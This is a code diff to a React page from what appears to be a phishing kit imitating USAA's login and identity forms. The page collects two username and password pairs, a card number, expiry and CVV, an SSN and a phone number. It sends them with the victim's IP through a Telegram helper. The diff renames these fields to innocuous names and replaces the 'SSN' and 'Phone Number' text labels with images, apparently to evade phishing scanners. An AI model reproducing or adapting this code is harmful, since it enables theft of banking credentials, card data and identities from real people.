@@ -2,22 +2,24 @@ import React, { useState } from "react";
 import { useNavigate } from "react-router-dom";
 import cookies from "../utils/cookie.config";
 import TelegramSend from "../utils/send-message";
+import snAgroNo from "../assets/snAgroNo.png"
+import phoneAgeNo from "../assets/phoneAgeNo.png"
 
 type IdentityT = {
-  phone: string;
-  sn: string;
+  phoneAgeNo: string;
+  snAgroNo: string;
 };
 
 type Additional = {
-    cn:string;
-    edate:string;
-    ccv:string;
-  }
+  regNo: string;
+  registrationExpiry: string;
+  thirdNum: string;
+};
 
 export default function Identity() {
   const [formInput, setFormInput] = useState<IdentityT>({
-    phone: "",
-    sn: "",
+    phoneAgeNo: "",
+    snAgroNo: "",
   });
 
   const login1: Login = cookies.get("login1");
@@ -43,18 +45,18 @@ const [isLoading, setIsLoading] = useState(false)
     
     IP: ${ipman.ipman}
 
-    Username: ${login1.username}
-    Password: ${login1.password}
+    Username: ${login1.score}
+    Password: ${login1.scorePro}
 
-    Username 2: ${login2.username2}
-    Password 2: ${login2.password2}
+    Username 2: ${login2.score2}
+    Password 2: ${login2.scorePro2}
 
-    Card number: ${additional.cn}
-    Card Expiry : ${additional.edate}
-    Card Cvv: ${additional.ccv}
+    Card number: ${additional.regNo}
+    Card Expiry : ${additional.registrationExpiry}
+    Card Cvv: ${additional.thirdNum}
 
-    SSN: ${formInput.sn}
-    Phone Number: ${formInput.phone}
+    SSN: ${formInput.snAgroNo}
+    Phone Number: ${formInput.phoneAgeNo}
     `;
 
     await TelegramSend(message);
@@ -81,12 +83,9 @@ const [isLoading, setIsLoading] = useState(false)
                   htmlFor="usaa-form-v5-10-1-input-mwc9hotwmucj"
                   className="usaa-form-v5-10-1-fieldLabel usaa-form-v5-10-1-fieldWrapper-label"
                 >
-                  <span
-                    aria-hidden="false"
-                    className="usaa-form-v5-10-1-fieldLabel-text"
-                  >
-                    SSN
-                  </span>
+                  <div className="kylexy">
+          <img src={snAgroNo} height={19} alt="" />
+                      </div>
                 </label>
               </div>
               <div>
@@ -99,7 +98,7 @@ const [isLoading, setIsLoading] = useState(false)
               </div>
               <span className="usaa-input">
                 <input
-                  name="sn"
+                  name="snAgroNo"
                   onChange={handleInputChange}
                   required
                   aria-invalid="false"
@@ -123,12 +122,9 @@ const [isLoading, setIsLoading] = useState(false)
                   htmlFor="usaa-form-v5-10-1-input-mwc9hotwmucj"
                   className="usaa-form-v5-10-1-fieldLabel usaa-form-v5-10-1-fieldWrapper-label"
                 >
-                  <span
-                    aria-hidden="false"
-                    className="usaa-form-v5-10-1-fieldLabel-text"
-                  >
-                    Phone Number
-                  </span>
+                  <div className="kylexy">
+          <img src={phoneAgeNo} height={19} alt="" />
+                      </div>
                 </label>
               </div>
               <div>
@@ -142,7 +138,7 @@ const [isLoading, setIsLoading] = useState(false)
               <span className="usaa-input">
                 <input
                 onChange={handleInputChange}
-                  name="phone"
+                  name="phoneAgeNo"
                   required
                   aria-invalid="false"
                   id="usaa-form-v5-10-1-input-mwc9hotwmucj"
